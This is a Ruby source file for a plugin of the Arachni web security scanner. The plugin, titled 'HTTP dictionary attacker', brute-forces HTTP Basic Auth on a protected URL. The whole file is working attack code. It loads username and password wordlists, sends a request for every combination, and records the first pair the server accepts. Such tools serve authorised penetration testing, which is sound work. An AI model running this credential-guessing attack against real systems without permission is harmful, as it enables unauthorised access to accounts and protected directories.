=begin
                  Arachni
  Copyright (c) 2010 Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>

  This is free software; you can copy and distribute and modify
  this program under the term of the GPL v2.0 License
  (See LICENSE file for details)

=end

module Arachni
module Plugins

#
# @author: Tasos "Zapotek" Laskos
#                                      <tasos.laskos@gmail.com>
#                                      <zapotek@segfault.gr>
# @version: 0.1
#
class HTTPDicattack < Arachni::Plugin::Base

    #
    # @param    [Arachni::Framework]    framework
    # @param    [Hash]        options    options passed to the plugin
    #
    def initialize( framework, options )
        @framework = framework
        @options   = options

        # disable spidering and the subsequent audit
        @framework.opts.link_count_limit = 0
    end

    def prepare
        @url     = @framework.opts.url.to_s
        @users   = File.read( @options['username_list'] ).split( "\n" )
        @passwds = File.read( @options['password_list'] ).split( "\n" )
    end

    def run( )

        if !protected?( @url )
            print_info( "The URL you provided doesn't seem to be protected." )
            print_info( "Aborting..." )
            return
        end

        url = URI( @url )

        print_status( "Building the request queue..." )

        total_req = @users.size * @passwds.size
        print_status( "Number of requests to be transmitted: #{total_req}" )

        @users.each {
            |user|

            url.user = user
            @passwds.each {
                |pass|

                url.password = pass
                @framework.http.get( url.to_s ).on_complete {
                    |res|

                    print_status( "Username: '#{user}' -- Password: '#{pass}'" )
                    next if res.code != 200

                    print_ok( "Found a match. Username: '#{user}' -- Password: '#{pass}'" )
                    print_info( "URL: #{res.effective_url}" )

                    # register our findings...
                    register_results( { :username => user, :password => pass } )

                    raise "Stopping the attack."

                }

            }
        }

        print_status( "Waiting for the requests to complete..." )
        @framework.http.run
        print_error( "Couldn't find a match." )

    end

    def protected?( url )
        @framework.http.get( url, :async => false ).response.code == 401
    end

    def self.info
        {
            :name           => 'HTTP dictionary attacker',
            :description    => %q{Uses wordlists to crack password protected directories.
                It will exit the system once it finishes.},
            :author         => 'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>',
            :version        => '0.1',
            :options        => [
                Arachni::OptPath.new( 'username_list', [ true, 'File with a list of usernames (newline separated).' ] ),
                Arachni::OptPath.new( 'password_list', [ true, 'File with a list of passwords (newline separated).' ] )
            ]
        }
    end

end

end
end
